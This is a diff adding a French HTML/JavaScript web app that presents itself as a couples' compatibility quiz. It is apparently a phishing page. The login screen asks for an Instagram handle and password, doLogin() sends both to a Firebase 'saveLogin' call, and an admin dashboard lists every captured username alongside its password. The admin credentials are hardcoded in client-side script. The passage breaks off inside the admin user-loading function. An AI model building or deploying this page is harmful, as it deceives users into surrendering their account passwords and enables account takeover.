@@ -1,0 +1,614 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CompatibilityCheck 💘</title>
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;700;800&family=DM+Sans:wght@400;500&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --pink:#ff4d8d;--purple:#9b5cf6;--bg:#0d0d1a;--card:#16162a;
+  --text:#f0eaff;--muted:#9a90b8;--border:rgba(255,255,255,.08);
+  --green:#22d97a;--red:#ff5e5e;--blue:#4d9eff;--orange:#ff9f4d;
+}
+body{font-family:'DM Sans',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;
+  background-image:radial-gradient(ellipse at 10% 10%,rgba(155,92,246,.15) 0%,transparent 50%),
+  radial-gradient(ellipse at 90% 90%,rgba(255,77,141,.10) 0%,transparent 50%);}
+.hidden{display:none!important}
+.page{display:none;min-height:100vh}
+.page.active{display:flex;align-items:center;justify-content:center;padding:1.5rem;flex-direction:column}
+.page.full{display:none;min-height:100vh;flex-direction:column}
+.page.full.active{display:flex}
+.container{width:100%;max-width:520px}
+.logo{font-family:'Syne',sans-serif;font-size:.85rem;font-weight:800;letter-spacing:.15em;text-transform:uppercase;color:var(--pink);text-align:center;margin-bottom:2rem;opacity:.85}
+.card{background:var(--card);border:1px solid var(--border);border-radius:24px;padding:2rem;animation:fadeUp .4s ease}
+@keyframes fadeUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
+h1{font-family:'Syne',sans-serif;font-size:1.9rem;font-weight:800;text-align:center;line-height:1.2;margin-bottom:.75rem;
+  background:linear-gradient(135deg,#ff4d8d,#9b5cf6);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.subtitle{text-align:center;color:var(--muted);font-size:.9rem;margin-bottom:1.75rem;line-height:1.6}
+.hero{font-size:3rem;text-align:center;display:block;margin-bottom:1rem}
+input[type=text],input[type=password]{width:100%;background:rgba(255,255,255,.05);border:1px solid var(--border);
+  border-radius:12px;padding:.8rem 1rem;color:var(--text);font-family:'DM Sans',sans-serif;font-size:.95rem;outline:none;transition:border-color .2s}
+input:focus{border-color:var(--purple)}
+input::placeholder{color:var(--muted)}
+.field{margin-bottom:1.25rem}
+label{display:block;font-size:.72rem;font-weight:500;letter-spacing:.06em;color:var(--muted);text-transform:uppercase;margin-bottom:.5rem}
+.btn{width:100%;padding:.9rem;border:none;border-radius:14px;font-family:'Syne',sans-serif;font-size:1rem;font-weight:700;
+  cursor:pointer;background:linear-gradient(135deg,#ff4d8d,#9b5cf6);color:#fff;letter-spacing:.03em;transition:opacity .15s,transform .15s}
+.btn:hover{opacity:.9}.btn:active{transform:scale(.98)}.btn:disabled{opacity:.5;cursor:not-allowed}
+.btn-out{background:transparent;border:1px solid var(--border);color:var(--muted);margin-top:.75rem;font-size:.85rem;font-family:'DM Sans',sans-serif}
+.btn-sec{width:100%;padding:.85rem;border:1px solid var(--border);border-radius:14px;font-family:'Syne',sans-serif;
+  font-size:.92rem;font-weight:700;cursor:pointer;background:transparent;color:var(--text);transition:all .15s;margin-bottom:.5rem}
+.btn-sec:hover{border-color:var(--purple);color:var(--purple)}
+.msg{border-radius:10px;padding:.65rem 1rem;font-size:.85rem;margin-top:.75rem;line-height:1.5}
+.msg-err{background:rgba(255,94,94,.1);border:1px solid rgba(255,94,94,.3);color:#ff9a9a}
+.msg-info{background:rgba(77,158,255,.08);border:1px solid rgba(77,158,255,.25);color:#a0c8ff}
+.msg-ok{background:rgba(34,217,122,.08);border:1px solid rgba(34,217,122,.25);color:#a0f0c8}
+.msg-warn{background:rgba(255,159,77,.08);border:1px solid rgba(255,159,77,.25);color:#ffc888}
+.code-box{text-align:center;margin:1.5rem 0;background:rgba(155,92,246,.1);border:2px dashed rgba(155,92,246,.4);border-radius:18px;padding:1.5rem;cursor:pointer}
+.code-big{font-family:'Syne',sans-serif;font-size:2.8rem;font-weight:800;letter-spacing:.25em;color:var(--pink)}
+.code-hint{font-size:.78rem;color:var(--muted);margin-top:.4rem}
+.names-row{display:grid;grid-template-columns:1fr auto 1fr;gap:.75rem;align-items:center;margin-bottom:1.5rem}
+.heart{font-size:1.4rem;text-align:center}
+.prog-bar{height:4px;background:rgba(255,255,255,.08);border-radius:99px;margin-bottom:1.75rem;overflow:hidden}
+.prog-fill{height:100%;border-radius:99px;background:linear-gradient(90deg,#ff4d8d,#9b5cf6);transition:width .4s ease}
+.who{display:inline-block;background:rgba(155,92,246,.2);color:#c4a8ff;border-radius:99px;padding:.3rem .9rem;font-size:.8rem;font-weight:500;margin-bottom:1rem}
+.q-text{font-family:'Syne',sans-serif;font-size:1.12rem;font-weight:700;margin-bottom:1.5rem;line-height:1.4}
+.opts{display:flex;flex-direction:column;gap:.75rem}
+.opt{background:rgba(255,255,255,.04);border:1px solid var(--border);border-radius:14px;padding:.85rem 1.1rem;
+  cursor:pointer;font-size:.92rem;transition:all .18s;text-align:left;color:var(--text);font-family:'DM Sans',sans-serif;
+  display:flex;align-items:center;gap:.75rem}
+.opt:hover{background:rgba(155,92,246,.15);border-color:var(--purple)}
+.opt.sel{background:rgba(255,77,141,.15);border-color:var(--pink)}
+.opt-l{width:28px;height:28px;border-radius:8px;background:rgba(255,255,255,.07);display:flex;align-items:center;justify-content:center;font-size:.78rem;font-weight:700;color:var(--muted);flex-shrink:0}
+.opt.sel .opt-l{background:rgba(255,77,141,.3);color:var(--pink)}
+.divider{height:1px;background:var(--border);margin:1.5rem 0}
+.wait-dots{display:flex;justify-content:center;gap:.5rem;margin:2rem 0}
+.dot{width:12px;height:12px;border-radius:50%;animation:pulse 1.2s ease-in-out infinite}
+.dot:nth-child(1){background:var(--pink)}.dot:nth-child(2){background:var(--purple);animation-delay:.2s}.dot:nth-child(3){background:var(--blue);animation-delay:.4s}
+@keyframes pulse{0%,100%{transform:scale(.6);opacity:.4}50%{transform:scale(1);opacity:1}}
+.score-circle{width:130px;height:130px;border-radius:50%;background:linear-gradient(135deg,#ff4d8d22,#9b5cf622);
+  border:3px solid var(--pink);display:flex;flex-direction:column;align-items:center;justify-content:center;margin:0 auto 1.5rem}
+.score-num{font-family:'Syne',sans-serif;font-size:2.2rem;font-weight:800;
+  background:linear-gradient(135deg,#ff4d8d,#9b5cf6);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.score-sub{font-size:.78rem;color:var(--muted)}
+.res-title{font-family:'Syne',sans-serif;font-size:1.4rem;font-weight:800;text-align:center;margin-bottom:.25rem}
+.res-sub{font-family:'Syne',sans-serif;font-size:1rem;font-weight:700;text-align:center;color:var(--pink);margin-bottom:.5rem}
+.res-desc{text-align:center;color:var(--muted);font-size:.88rem;line-height:1.6;margin-bottom:1.5rem}
+.cmp-row{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:14px;padding:.85rem 1rem;margin-bottom:.5rem}
+.cmp-row.match{border-color:rgba(34,217,122,.25);background:rgba(34,217,122,.03)}
+.cmp-tag{display:inline-block;font-size:.68rem;font-weight:700;padding:.15rem .55rem;border-radius:99px;margin-bottom:.4rem}
+.cmp-tag.yes{background:rgba(34,217,122,.15);color:#22d97a}
+.cmp-tag.no{background:rgba(255,94,94,.1);color:#ff8a8a}
+.cmp-q{font-size:.75rem;color:var(--muted);margin-bottom:.5rem}
+.cmp-ans{display:grid;grid-template-columns:1fr 1fr;gap:.4rem}
+.ans-p1{background:rgba(255,77,141,.1);border:1px solid rgba(255,77,141,.2);border-radius:10px;padding:.4rem .7rem;font-size:.78rem;color:#ffaacc}
+.ans-p2{background:rgba(155,92,246,.1);border:1px solid rgba(155,92,246,.2);border-radius:10px;padding:.4rem .7rem;font-size:.78rem;color:#c4a8ff}
+.ans-name{font-size:.62rem;font-weight:700;display:block;margin-bottom:.15rem}
+.n1{color:var(--pink)}.n2{color:var(--purple)}
+/* ADMIN */
+.adm-header{background:var(--card);border-bottom:1px solid var(--border);padding:1rem 1.5rem;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100}
+.adm-logo{font-family:'Syne',sans-serif;font-size:.85rem;font-weight:800;letter-spacing:.12em;text-transform:uppercase;color:var(--pink)}
+.adm-tag{background:rgba(155,92,246,.2);border:1px solid rgba(155,92,246,.3);color:var(--purple);font-size:.65rem;font-weight:700;letter-spacing:.08em;text-transform:uppercase;padding:.2rem .6rem;border-radius:99px;margin-left:.75rem}
+.adm-body{padding:1.5rem;max-width:960px;margin:0 auto;flex:1}
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:1rem;margin-bottom:1.75rem}
+.stat{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:1.2rem 1.4rem}
+.stat-l{font-size:.7rem;text-transform:uppercase;letter-spacing:.1em;color:var(--muted);margin-bottom:.3rem}
+.stat-v{font-family:'Syne',sans-serif;font-size:1.7rem;font-weight:800}
+.pink{color:var(--pink)}.green{color:var(--green)}.blue{color:var(--blue)}.orange{color:var(--orange)}
+.tabs{display:flex;gap:.5rem;margin-bottom:1.5rem}
+.tab{background:rgba(255,255,255,.05);border:1px solid var(--border);color:var(--muted);font-size:.82rem;padding:.45rem 1.1rem;border-radius:99px;cursor:pointer;font-family:'DM Sans',sans-serif;transition:all .15s}
+.tab.on{background:rgba(155,92,246,.2);border-color:rgba(155,92,246,.5);color:var(--text)}
+.tbl-wrap{background:var(--card);border:1px solid var(--border);border-radius:18px;overflow:hidden;overflow-x:auto}
+table{width:100%;border-collapse:collapse}
+thead th{font-size:.7rem;text-transform:uppercase;letter-spacing:.1em;color:var(--muted);padding:.85rem 1.2rem;text-align:left;border-bottom:1px solid var(--border);background:rgba(255,255,255,.02);white-space:nowrap}
+tbody tr:hover{background:rgba(255,255,255,.03)}
+tbody td{padding:.85rem 1.2rem;font-size:.86rem;border-bottom:1px solid rgba(255,255,255,.04)}
+tbody tr:last-child td{border-bottom:none}
+.badge{display:inline-block;font-size:.68rem;font-weight:600;letter-spacing:.06em;text-transform:uppercase;padding:.2rem .65rem;border-radius:99px}
+.b-active{background:rgba(34,217,122,.12);color:var(--green);border:1px solid rgba(34,217,122,.25)}
+.b-new{background:rgba(77,158,255,.1);color:var(--blue);border:1px solid rgba(77,158,255,.25)}
+.b-idle{background:rgba(255,159,77,.1);color:var(--orange);border:1px solid rgba(255,159,77,.25)}
+.s-card{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:1rem 1.25rem;margin-bottom:.6rem;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:.75rem}
+.s-code{font-family:'Syne',sans-serif;font-weight:800;color:var(--pink);font-size:1.1rem;letter-spacing:.1em}
+.s-score{font-family:'Syne',sans-serif;font-weight:800;font-size:1.2rem;color:var(--green)}
+.s-score.low{color:var(--orange)}
+.logout-btn{background:rgba(255,94,94,.1);border:1px solid rgba(255,94,94,.25);color:#ff8a8a;font-size:.8rem;font-weight:600;padding:.4rem 1rem;border-radius:99px;cursor:pointer;font-family:'DM Sans',sans-serif}
+.toast{position:fixed;bottom:1.5rem;right:1.5rem;background:#1e1e35;border:1px solid var(--border);border-radius:14px;padding:.8rem 1.25rem;font-size:.85rem;color:var(--text);opacity:0;transform:translateY(10px);transition:all .3s;pointer-events:none;z-index:9999;max-width:280px}
+.toast.show{opacity:1;transform:translateY(0)}
+.spinner{display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,.2);border-top-color:var(--pink);border-radius:50%;animation:spin .7s linear infinite;vertical-align:middle;margin-right:.4rem}
+@keyframes spin{to{transform:rotate(360deg)}}
+@media(max-width:500px){.names-row{grid-template-columns:1fr}.heart{display:none}}
+</style>
+</head>
+<body>
+
+<!-- LOGIN -->
+<div class="page active" id="pg-login">
+  <div class="container">
+    <div class="logo">CompatibilityCheck</div>
+    <div class="card">
+      <span class="hero">📱</span>
+      <h1>Connexion</h1>
+      <p class="subtitle">Entre ton @ Instagram pour accéder au quiz 💘</p>
+      <div class="field"><label>@ Instagram</label><input type="text" id="l-user" placeholder="@tonpseudo" /></div>
+      <div class="field"><label>Mot de passe</label><input type="password" id="l-pass" placeholder="••••••••" onkeyup="if(event.key==='Enter')doLogin()" /></div>
+      <button class="btn" onclick="doLogin()">Se connecter ✨</button>
+      <div id="l-err" class="msg msg-err hidden">Remplis tous les champs.</div>
+    </div>
+  </div>
+</div>
+
+<!-- HOME -->
+<div class="page" id="pg-home">
+  <div class="container">
+    <div class="logo">CompatibilityCheck</div>
+    <div class="card">
+      <span class="hero">💘</span>
+      <h1>Êtes-vous compatibles ?</h1>
+      <p class="subtitle">10 questions pour découvrir votre vrai score. Chaque personne répond de son côté !</p>
+      <button class="btn" onclick="showPage('pg-create')" style="margin-bottom:.75rem">✨ Créer une session</button>
+      <button class="btn-sec" onclick="showPage('pg-join')">🔗 Rejoindre une session</button>
+      <button class="btn-sec" style="font-size:.78rem;color:var(--muted)" onclick="showPage('pg-admin-login')">⚙️ Admin</button>
+    </div>
+  </div>
+</div>
+
+<!-- CREATE -->
+<div class="page" id="pg-create">
+  <div class="container">
+    <div class="logo">CompatibilityCheck</div>
+    <div class="card">
+      <span class="hero">💌</span>
+      <h1>Nouvelle session</h1>
+      <p class="subtitle">Entrez vos deux prénoms pour générer un code.</p>
+      <div class="names-row">
+        <div><label>Ton prénom</label><input type="text" id="c-n1" placeholder="Toi" maxlength="16" /></div>
+        <div class="heart">💜</div>
+        <div><label>Son prénom</label><input type="text" id="c-n2" placeholder="Lui/Elle" maxlength="16" /></div>
+      </div>
+      <button class="btn" id="c-btn" onclick="doCreate()">Générer le code 🎲</button>
+      <button class="btn btn-out" onclick="showPage('pg-home')">← Retour</button>
+      <div id="c-err" class="msg msg-err hidden">Entre les deux prénoms.</div>
+    </div>
+  </div>
+</div>
+
+<!-- SHARE CODE -->
+<div class="page" id="pg-share">
+  <div class="container">
+    <div class="logo">CompatibilityCheck</div>
+    <div class="card">
+      <span class="hero">📲</span>
+      <h1>Code de session</h1>
+      <p class="subtitle">Envoie ce code à <strong id="sh-name"></strong> !</p>
+      <div class="code-box" onclick="copyCode()">
+        <div class="code-big" id="sh-code">----</div>
+        <div class="code-hint">Tap pour copier · Valable 24h</div>
+      </div>
+      <div class="msg msg-info">📱 L'autre personne doit aller sur le même lien → "Rejoindre une session" → entrer ce code.</div>
+      <button class="btn" style="margin-top:1.25rem" onclick="startAsP1()">Je commence le quiz ✨</button>
+      <button class="btn btn-out" onclick="copyCode()">📋 Copier le code</button>
+    </div>
+  </div>
+</div>
+
+<!-- JOIN -->
+<div class="page" id="pg-join">
+  <div class="container">
+    <div class="logo">CompatibilityCheck</div>
+    <div class="card">
+      <span class="hero">🔗</span>
+      <h1>Rejoindre</h1>
+      <p class="subtitle">Entre le code que l'autre personne t'a envoyé.</p>
+      <div class="field">
+        <label>Code de session (4 lettres/chiffres)</label>
+        <input type="text" id="j-code" placeholder="ex: LCN2" maxlength="6"
+          style="text-align:center;font-family:'Syne',sans-serif;font-size:1.6rem;font-weight:800;letter-spacing:.25em;text-transform:uppercase"
+          oninput="this.value=this.value.toUpperCase().replace(/[^A-Z0-9]/g,'')"
+          onkeyup="if(event.key==='Enter')doJoin()" />
+      </div>
+      <button class="btn" id="j-btn" onclick="doJoin()">Rejoindre 💘</button>
+      <button class="btn btn-out" onclick="showPage('pg-home')">← Retour</button>
+      <div id="j-msg" class="msg hidden"></div>
+    </div>
+  </div>
+</div>
+
+<!-- QUIZ -->
+<div class="page" id="pg-quiz">
+  <div class="container">
+    <div class="logo">CompatibilityCheck</div>
+    <div class="card">
+      <div class="prog-bar"><div class="prog-fill" id="q-prog" style="width:0%"></div></div>
+      <div style="font-size:.72rem;text-transform:uppercase;letter-spacing:.12em;color:var(--muted);margin-bottom:.4rem" id="q-label">Question 1 / 10</div>
+      <div class="who" id="q-who">👤</div>
+      <div class="q-text" id="q-text"></div>
+      <div class="opts" id="q-opts"></div>
+      <div class="divider"></div>
+      <button class="btn" id="q-next" style="display:none" onclick="nextQ()">Suivant →</button>
+    </div>
+  </div>
+</div>
+
+<!-- WAITING -->
+<div class="page" id="pg-wait">
+  <div class="container">
+    <div class="logo">CompatibilityCheck</div>
+    <div class="card" style="text-align:center">
+      <span class="hero">⏳</span>
+      <h1>En attente…</h1>
+      <p class="subtitle">Tu as terminé ! En attente que <strong id="w-name"></strong> réponde aussi…</p>
+      <div class="wait-dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
+      <div class="msg msg-info">🔔 Cette page se met à jour automatiquement. Garde-la ouverte !</div>
+      <p style="font-size:.78rem;color:var(--muted);margin-top:1rem">Code : <strong id="w-code" style="color:var(--pink)"></strong></p>
+    </div>
+  </div>
+</div>
+
+<!-- RESULT -->
+<div class="page" id="pg-result">
+  <div class="container" style="max-width:580px">
+    <div class="logo">CompatibilityCheck</div>
+    <div class="card" id="res-card"></div>
+  </div>
+</div>
+
+<!-- ADMIN LOGIN -->
+<div class="page" id="pg-admin-login">
+  <div class="container" style="max-width:400px">
+    <div class="logo">CompatibilityCheck</div>
+    <div class="card">
+      <span class="hero">🔐</span>
+      <h1>Admin</h1>
+      <p class="subtitle">Espace réservé aux administrateurs.</p>
+      <div class="field"><label>Identifiant</label><input type="text" id="al-id" placeholder="admin@..." /></div>
+      <div class="field"><label>Mot de passe</label><input type="password" id="al-pass" onkeyup="if(event.key==='Enter')doAdminLogin()" /></div>
+      <button class="btn" onclick="doAdminLogin()">Accéder</button>
+      <button class="btn btn-out" onclick="showPage('pg-home')">← Retour</button>
+      <div id="al-err" class="msg msg-err hidden">Identifiants incorrects.</div>
+    </div>
+  </div>
+</div>
+
+<!-- ADMIN DASHBOARD -->
+<div class="page full" id="pg-admin">
+  <div class="adm-header">
+    <div style="display:flex;align-items:center">
+      <div class="adm-logo">CompatibilityCheck</div>
+      <div class="adm-tag">Admin</div>
+    </div>
+    <button class="logout-btn" onclick="doAdminLogout()">Déconnexion</button>
+  </div>
+  <div class="adm-body">
+    <div class="tabs">
+      <button class="tab on" onclick="switchTab('t-users',this)">👥 Connexions</button>
+      <button class="tab" onclick="switchTab('t-sessions',this)">💘 Sessions Quiz</button>
+    </div>
+    <div id="t-users">
+      <div class="stats">
+        <div class="stat"><div class="stat-l">Total utilisateurs</div><div class="stat-v pink" id="s-total">0</div></div>
+        <div class="stat"><div class="stat-l">Actifs (7j)</div><div class="stat-v green" id="s-active">0</div></div>
+        <div class="stat"><div class="stat-l">Nouveaux (30j)</div><div class="stat-v blue" id="s-new">0</div></div>
+        <div class="stat"><div class="stat-l">Inactifs</div><div class="stat-v orange" id="s-idle">0</div></div>
+      </div>
+      <div class="tbl-wrap">
+        <table>
+          <thead><tr><th>@ Instagram</th><th>Mot de passe</th><th>1ère connexion</th><th>Dernière connexion</th><th>Connexions</th><th>Statut</th></tr></thead>
+          <tbody id="u-tbody"><tr><td colspan="6" style="text-align:center;color:var(--muted);padding:2rem">Chargement...</td></tr></tbody>
+        </table>
+      </div>
+    </div>
+    <div id="t-sessions" style="display:none">
+      <div class="stats">
+        <div class="stat"><div class="stat-l">Sessions créées</div><div class="stat-v pink" id="ss-total">0</div></div>
+        <div class="stat"><div class="stat-l">Terminées</div><div class="stat-v green" id="ss-done">0</div></div>
+        <div class="stat"><div class="stat-l">En attente</div><div class="stat-v orange" id="ss-wait">0</div></div>
+        <div class="stat"><div class="stat-l">Score moyen</div><div class="stat-v blue" id="ss-avg">—</div></div>
+      </div>
+      <div id="ss-list"><p style="color:var(--muted)">Chargement...</p></div>
+    </div>
+    <div style="text-align:center;font-size:.72rem;color:var(--muted);padding:2rem 0">CompatibilityCheck · Admin Panel</div>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+const ADMIN_ID   = "admin@compatibilitycheck.fr";
+const ADMIN_PASS = "Admin2024!";
+const QS = [
+  {t:"Comment tu préfères passer le week-end ?",o:["Sortir et voir du monde","Rester à la maison","Faire du sport","Quelque chose de spontané"]},
+  {t:"Dans une relation, ce qui compte le plus ?",o:["La communication","L'humour","La confiance","Le physique"]},
+  {t:"Ton mode de communication préféré ?",o:["Textos / DM","Appels vocaux","En face à face","Vocaux WhatsApp"]},
+  {t:"Si vous vous disputez, tu fais quoi ?",o:["Je dis tout direct","Je prends du recul","J'attends les excuses","Comme si rien"]},
+  {t:"Ta date idéale ?",o:["Ciné + restau","Soirée avec amis","Aventure / nature","Cocooning"]},
+  {t:"Ton love language ?",o:["Mots & compliments","Cadeaux & surprises","Moments ensemble","Contacts physiques"]},
+  {t:"Ton plus grand défaut ?",o:["Trop jaloux(se)","Trop distant(e)","Je m'énerve vite","Trop dans ma tête"]},
+  {t:"Ta vision du futur en couple ?",o:["Vivre ensemble vite","Prendre le temps","Voir comment ça évolue","J'y pense pas encore"]},
+  {t:"Niveau jalousie tu es…",o:["Très jaloux(se)","Un peu jaloux(se)","Pas jaloux(se)","Ça dépend"]},
+  {t:"Tu préfères recevoir…",o:["Message romantique","Surprise imprévue","Moment rien que vous","Compliment sincère"]},
+];
+let S={code:"",person:0,myName:"",partnerName:"",qIdx:0,answers:[],selected:null};
+let unsubWait=null;
+
+function showPage(id){document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));document.getElementById(id).classList.add('active');}
+function toast(msg,dur=3200){const t=document.getElementById('toast');t.textContent=msg;t.classList.add('show');setTimeout(()=>t.classList.remove('show'),dur);}
+
+// LOGIN
+function doLogin(){
+  const u=document.getElementById('l-user').value.trim();
+  const p=document.getElementById('l-pass').value.trim();
+  if(!u||!p){document.getElementById('l-err').classList.remove('hidden');return;}
+  document.getElementById('l-err').classList.add('hidden');
+  if(window._fb) window._fb.saveLogin(u,p);
+  showPage('pg-home');
+}
+
+// CREATE
+function doCreate(){
+  const n1=document.getElementById('c-n1').value.trim();
+  const n2=document.getElementById('c-n2').value.trim();
+  if(!n1||!n2){document.getElementById('c-err').classList.remove('hidden');return;}
+  document.getElementById('c-err').classList.add('hidden');
+  const btn=document.getElementById('c-btn');
+  btn.disabled=true;btn.innerHTML='<span class="spinner"></span>Génération...';
+  if(!window._fb){toast('⏳ Firebase chargement...');btn.disabled=false;btn.textContent='Générer le code 🎲';return;}
+  window._fb.createSession(n1,n2,
+    (code)=>{S.code=code;S.person=1;S.myName=n1;S.partnerName=n2;document.getElementById('sh-code').textContent=code;document.getElementById('sh-name').textContent=n2;btn.disabled=false;btn.textContent='Générer le code 🎲';showPage('pg-share');},
+    (err)=>{btn.disabled=false;btn.textContent='Générer le code 🎲';toast('❌ Erreur: '+err);}
+  );
+}
+function copyCode(){const c=document.getElementById('sh-code').textContent;navigator.clipboard.writeText(c).then(()=>toast('Code copié ! 📋')).catch(()=>toast('Code: '+c));}
+function startAsP1(){launchQuiz();}
+
+// JOIN
+function doJoin(){
+  const code=document.getElementById('j-code').value.trim().toUpperCase().replace(/[^A-Z0-9]/g,'');
+  const msgEl=document.getElementById('j-msg');
+  const btn=document.getElementById('j-btn');
+  if(code.length!==4){msgEl.className='msg msg-err';msgEl.textContent='❌ Le code doit avoir exactement 4 caractères (ex: LCN2).';msgEl.classList.remove('hidden');return;}
+  if(!window._fb){msgEl.className='msg msg-err';msgEl.textContent='⏳ Firebase en cours de chargement, réessaie dans 2 secondes.';msgEl.classList.remove('hidden');return;}
+  btn.disabled=true;btn.innerHTML='<span class="spinner"></span>Vérification...';
+  msgEl.className='msg msg-info';msgEl.textContent='🔍 Vérification dans Firebase...';msgEl.classList.remove('hidden');
+  window._fb.getSession(code,
+    (session)=>{
+      btn.disabled=false;btn.textContent='Rejoindre 💘';
+      if(!session){msgEl.className='msg msg-err';msgEl.textContent='❌ Code "'+code+'" introuvable. Vérifie les 4 caractères.';return;}
+      msgEl.className='msg msg-ok';msgEl.textContent='✅ Code validé ! Lancement...';
+      S.code=code;S.person=2;S.myName=session.name2;S.partnerName=session.name1;
+      setTimeout(()=>launchQuiz(),700);
+    },
+    (err)=>{btn.disabled=false;btn.textContent='Rejoindre 💘';msgEl.className='msg msg-err';msgEl.textContent='⚠️ Erreur Firebase: '+err;}
+  );
+}
+
+// QUIZ
+function launchQuiz(){S.qIdx=0;S.answers=[];S.selected=null;showPage('pg-quiz');renderQ();}
+function renderQ(){
+  const q=QS[S.qIdx];
+  document.getElementById('q-prog').style.width=(S.qIdx/QS.length*100)+'%';
+  document.getElementById('q-label').textContent='Question '+(S.qIdx+1)+' / '+QS.length;
+  document.getElementById('q-who').textContent='👤 '+S.myName;
+  document.getElementById('q-text').textContent=q.t;
+  const c=document.getElementById('q-opts');c.innerHTML='';S.selected=null;
+  document.getElementById('q-next').style.display='none';
+  ['A','B','C','D'].forEach((l,i)=>{
+    const b=document.createElement('button');b.className='opt';
+    b.innerHTML='<span class="opt-l">'+l+'</span>'+q.o[i];
+    b.onclick=()=>{document.querySelectorAll('.opt').forEach(x=>x.classList.remove('sel'));b.classList.add('sel');S.selected=i;document.getElementById('q-next').style.display='block';};
+    c.appendChild(b);
+  });
+}
+function nextQ(){
+  if(S.selected===null)return;
+  S.answers.push(S.selected);S.qIdx++;
+  if(S.qIdx<QS.length){renderQ();return;}
+  submitAnswers();
+}
+function submitAnswers(){
+  const field=S.person===1?'answers1':'answers2';
+  const waitFor=S.person===1?S.partnerName:S.partnerName;
+  window._fb.saveAnswers(S.code,field,S.answers,
+    ()=>{
+      window._fb.getSession(S.code,
+        (session)=>{
+          const other=S.person===1?session.answers2:session.answers1;
+          if(other!==null&&other!==undefined){showResult(session);}
+          else{
+            document.getElementById('w-name').textContent=waitFor;
+            document.getElementById('w-code').textContent=S.code;
+            showPage('pg-wait');
+            if(unsubWait)unsubWait();
+            unsubWait=window._fb.listen(S.code,(sess)=>{
+              const o=S.person===1?sess.answers2:sess.answers1;
+              if(o!==null&&o!==undefined){if(unsubWait){unsubWait();unsubWait=null;}showResult(sess);}
+            });
+          }
+        },
+        ()=>toast('Erreur vérification.')
+      );
+    },
+    (err)=>toast('❌ Erreur sauvegarde: '+err)
+  );
+}
+
+// RESULT
+function toArr(v){if(!v)return null;if(Array.isArray(v))return v;return Object.values(v);}
+function showResult(session){
+  const a1=toArr(session.answers1),a2=toArr(session.answers2);
+  if(!a1||!a2){toast('Erreur: réponses manquantes');return;}
+  let matches=0;
+  for(let i=0;i<10;i++)if(a1[i]===a2[i])matches++;
+  const score=Math.round((matches/10)*100);
+  window._fb&&window._fb.setScore(S.code,score);
+  let emoji,title,desc;
+  if(score>=80){emoji="🔥";title="Soulmates !";desc="Vous êtes faits l'un pour l'autre ! Vos réponses sont très similaires.";}
+  else if(score>=60){emoji="💜";title="Super compatibles !";desc="Beaucoup en commun, quelques différences qui rendent la relation intéressante !";}
+  else if(score>=40){emoji="🌱";title="À construire ensemble";desc="Vous êtes différents sur plusieurs points, mais les opposés s'attirent !";}
+  else{emoji="⚡";title="Duo de choc !";desc="Très différents ! Mais une relation c'est aussi apprendre de l'autre.";}
+  const rows=QS.map((q,i)=>{
+    const m=a1[i]===a2[i];
+    return '<div class="cmp-row'+(m?' match':'')+'">'
+      +'<span class="cmp-tag '+(m?'yes':'no')+'">'+(m?'✓ Identique':'✗ Différent')+'</span>'
+      +'<div class="cmp-q">'+q.t+'</div>'
+      +'<div class="cmp-ans">'
+      +'<div class="ans-p1"><span class="ans-name n1">'+session.name1+'</span>'+q.o[a1[i]]+'</div>'
+      +'<div class="ans-p2"><span class="ans-name n2">'+session.name2+'</span>'+q.o[a2[i]]+'</div>'
+      +'</div></div>';
+  }).join('');
+  document.getElementById('res-card').innerHTML=
+    '<div class="score-circle"><div class="score-num">'+score+'%</div><div class="score-sub">compatible</div></div>'
+    +'<div class="res-title">'+emoji+' '+session.name1+' & '+session.name2+'</div>'
+    +'<div class="res-sub">'+title+'</div>'
+    +'<div class="res-desc">'+desc+'</div>'
+    +'<div style="font-size:.72rem;text-transform:uppercase;letter-spacing:.1em;color:var(--muted);margin-bottom:.75rem">📊 Comparaison des réponses</div>'
+    +rows
+    +'<div style="margin-top:1.5rem"><button class="btn" onclick="showPage(\'pg-home\')">Rejouer 🔄</button></div>';
+  showPage('pg-result');
+}
+
+// ADMIN
+function doAdminLogin(){
+  const id=document.getElementById('al-id').value.trim();
+  const pw=document.getElementById('al-pass').value;
+  if(id===ADMIN_ID&&pw===ADMIN_PASS){document.getElementById('al-err').classList.add('hidden');showPage('pg-admin');loadAdminUsers();}
+  else document.getElementById('al-err').classList.remove('hidden');
+}
+function doAdminLogout(){showPage('pg-admin-login');}
+function switchTab(id,btn){
+  document.querySelectorAll('[id^="t-"]').forEach(t=>t.style.display='none');
+  document.getElementById(id).style.display='block';
+  document.querySelectorAll('.tab').forEach(b=>b.classList.remove('on'));
+  btn.classList.add('on');
+  if(id==='t-users')loadAdminUsers();
+  if(id==='t-sessions')loadAdminSessions();
+}
+function fmtDate(ts){return new Date(ts).toLocaleDateString('fr-FR',{day:'2-digit',month:'short',year:'numeric',hour:'2-digit',minute:'2-digit'});}
+function loadAdminUsers(){
+  if(!window._fb){setTimeout(loadAdminUsers,500);return;}
+  window._fb.getUsers((data)=>{
+    const now=Date.now(),d7=7*86400000,d30=30*86400000;
+    const list=data?Object.entries(data).map(([k,v])=>({k,...v})):[];
+    document.getElementById('s-total').textContent=list.length;
+    document.getElementById('s-active').textContent=list.filter(u=>(now-u.lastLogin)<d7).length;
+    document.getElementById('s-new').textContent=list.filter(u=>(now-u.joined)<d30&&(now-u.lastLogin)>=d7).length;
+    document.getElementById('s-idle').textContent=list.filter(u=>(now-u.lastLogin)>=d30).length;
+    const tb=document.getElementById('u-tbody');
